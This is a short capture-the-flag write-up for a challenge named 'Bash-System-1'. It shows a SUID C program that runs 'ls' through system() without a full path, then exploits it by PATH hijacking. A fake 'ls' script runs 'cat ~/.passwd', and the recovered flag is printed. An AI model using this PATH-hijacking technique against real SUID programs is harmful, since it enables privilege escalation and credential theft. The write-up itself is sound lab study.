---
layout: default
title: Bash-System-1
---
Here in the challenge we get the source code:
```C
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main(void)
{
    setreuid(geteuid(), geteuid());
    system("ls /challenge/app-script/ch11/.passwd");
    return 0;
}
```

The binary file is compiled with SUID bit. 

We can create our own `ls` command and put it inside `/tmp/ch11/ls`, and then changing the `PATH` variable to point into it.

First, create the folder:
```bash
mkdir -p /tmp/ch11
```

Then, set the `PATH` varaible:
```bash
export PATH=/tmp/ch11:$PATH
```

Now, we can create the fake `ls`:
```bash
echo -e '#!/bin/bash\ncat ~/.passwd' > /tmp/ch11/ls
chmod +x /tmp/ch11/ls
```

and trigger it:
```bash
app-script-ch11@challenge02:/tmp/ch11$ ~/ch11
!oPe96a/.s8d5
```

